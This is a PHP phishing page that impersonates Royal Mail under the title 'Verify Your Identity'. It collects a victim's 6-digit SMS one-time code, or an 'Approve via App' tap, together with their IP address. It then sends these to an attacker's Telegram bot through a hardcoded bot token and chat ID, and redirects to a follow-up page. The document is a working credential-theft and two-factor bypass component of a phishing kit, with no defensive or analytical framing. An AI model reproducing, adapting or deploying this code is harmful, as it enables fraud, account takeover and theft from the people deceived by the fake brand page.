<?php
// === Antibot (optional, customize as needed) ===
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$userIP = getUserIP();

// Telegram Bot config
define('TELEGRAM_BOT_TOKEN', '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s');
define('TELEGRAM_CHAT_ID', '-4932499123');

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $smsCode = trim($_POST['sms_code'] ?? '');
    $approveApp = isset($_POST['approve_app']);

    if ($approveApp) {
        // User tapped "Approve via App"
        $message = "📲 *User tapped APPROVE via App*\n🌐 IP: `$userIP`";
    } else {
        // Validate SMS code: must be 6 digits
        if (!preg_match('/^\d{6}$/', $smsCode)) {
            $error = 'Please enter a valid 6-digit SMS code.';
        } else {
            $message = "🔐 *SMS Code Entered:*\n\n📩 Code: `$smsCode`\n🌐 IP: `$userIP`";
        }
    }

    // If no validation errors, send Telegram message
    if (!$error) {
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $post_fields = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);

        if ($result !== false) {
            header('Location: wait3.php');
            exit;
        } else {
            $error = 'Failed to send data. Please try again.';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail - Verify Your Identity</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
<style>
  :root {
    --rm-red: #cc0000;
    --rm-white: #fff;
    --rm-lightgray: #f8f9fa;
    --rm-darkgray: #212529;
  }
  body {
    background-color: var(--rm-lightgray);
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: var(--rm-darkgray);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    padding: 2rem 1rem 4rem;
  }
  nav.navbar {
    background-color: var(--rm-red);
    padding: 1rem 1.5rem;
  }
  nav.navbar img {
    height: 60px;
    user-select: none;
  }
  main.container {
    max-width: 460px;
    margin: 2rem auto;
    background: var(--rm-white);
    border-radius: 15px;
    box-shadow: 0 12px 32px rgb(0 0 0 / 0.12);
    padding: 2.75rem 2.5rem 3rem;
  }
  h1 {
    color: var(--rm-red);
    font-weight: 700;
    margin-bottom: 1.2rem;
    text-align: center;
    font-size: 2rem;
  }
  p.lead {
    font-size: 1.1rem;
    text-align: center;
    color: #444;
    margin-bottom: 2rem;
  }
  label {
    font-weight: 600;
    font-size: 1rem;
  }
  input.form-control {
    border-radius: 10px;
    border: 2px solid #ced4da;
    font-size: 1.25rem;
    padding: 0.7rem 1.2rem;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
    text-align: center;
    letter-spacing: 0.25rem;
    user-select: text;
  }
  input.form-control:focus {
    border-color: var(--rm-red);
    box-shadow: 0 0 10px var(--rm-red);
    outline: none;
  }
  .btn-primary {
    background-color: var(--rm-red);
    border-color: var(--rm-red);
    border-radius: 12px;
    font-weight: 700;
    font-size: 1.15rem;
    padding: 0.85rem;
    width: 100%;
    transition: background-color 0.3s ease;
  }
  .btn-primary:hover,
  .btn-primary:focus {
    background-color: #a30000;
    border-color: #a30000;
  }
  .btn-outline-secondary {
    margin-top: 1rem;
    width: 100%;
    font-weight: 600;
    color: var(--rm-red);
    border-color: var(--rm-red);
    border-radius: 12px;
    font-size: 1.05rem;
    padding: 0.7rem;
    transition: background-color 0.3s ease, color 0.3s ease;
  }
  .btn-outline-secondary:hover,
  .btn-outline-secondary:focus {
    background-color: var(--rm-red);
    color: var(--rm-white);
  }
  .alert {
    margin-bottom: 1.75rem;
    border-radius: 12px;
    font-weight: 600;
    font-size: 0.95rem;
  }
  small.text-muted {
    display: block;
    margin-top: 0.5rem;
    text-align: center;
    color: #666;
  }
</style>
</head>
<body>

<nav class="navbar navbar-dark" role="banner" aria-label="Royal Mail navigation">
  <div class="container d-flex justify-content-center">
    <a href="#" aria-label="Royal Mail Home">
      <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" />
    </a>
  </div>
</nav>

<main class="container" role="main" aria-labelledby="pageTitle">

  <h1 id="pageTitle"><i class="fas fa-shield-alt me-2"></i>Verify Your Identity</h1>
  <p class="lead">Please enter the 6-digit code sent via SMS to your mobile device.</p>

  <?php if ($error): ?>
    <div class="alert alert-danger" role="alert" aria-live="assertive">
      <?= htmlspecialchars($error) ?>
    </div>
  <?php endif; ?>

  <form method="POST" novalidate aria-describedby="instructions" onsubmit="return validateForm();">
    <div id="instructions" class="visually-hidden">
      Enter your 6-digit SMS code to verify your identity.
    </div>

    <label for="sms_code" class="form-label">SMS Code <span class="text-danger">*</span></label>
    <input
      type="text"
      id="sms_code"
      name="sms_code"
      class="form-control"
      placeholder="••••••"
      maxlength="6"
      pattern="[0-9]{6}"
      inputmode="numeric"
      title="Enter the 6-digit code from your SMS"
      autocomplete="off"
      required
      aria-required="true"
      aria-describedby="smsHelp"
      value="<?= htmlspecialchars($_POST['sms_code'] ?? '') ?>"
    />
    <small id="smsHelp" class="text-muted">Your code is 6 digits long.</small>

    <button type="submit" class="btn btn-primary mt-4" id="submitBtn" aria-live="polite">
      Verify Code
      <i class="fas fa-arrow-right ms-2"></i>
    </button>

    <button type="submit" name="approve_app" value="1" class="btn btn-outline-secondary" aria-label="Approve via mobile app">
      Approve via App
      <i class="fas fa-mobile-alt ms-2"></i>
    </button>
  </form>
</main>

<script>
  const smsInput = document.getElementById('sms_code');
  const submitBtn = document.getElementById('submitBtn');

  function validateForm() {
    const code = smsInput.value.trim();
    const codeRegex = /^\d{6}$/;

    // If "Approve via App" button clicked, no SMS code required validation (form submits anyway)
    if (document.activeElement.name === 'approve_app') {
      submitBtn.disabled = true;
      submitBtn.innerHTML = 'Sending approval... <i class="fas fa-spinner fa-spin ms-2"></i>';
      return true;
    }

    if (!codeRegex.test(code)) {
      alert('Please enter a valid 6-digit SMS code.');
      smsInput.focus();
      return false;
    }
    submitBtn.disabled = true;
    submitBtn.innerHTML = 'Verifying... <i class="fas fa-spinner fa-spin ms-2"></i>';
    return true;
  }
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>
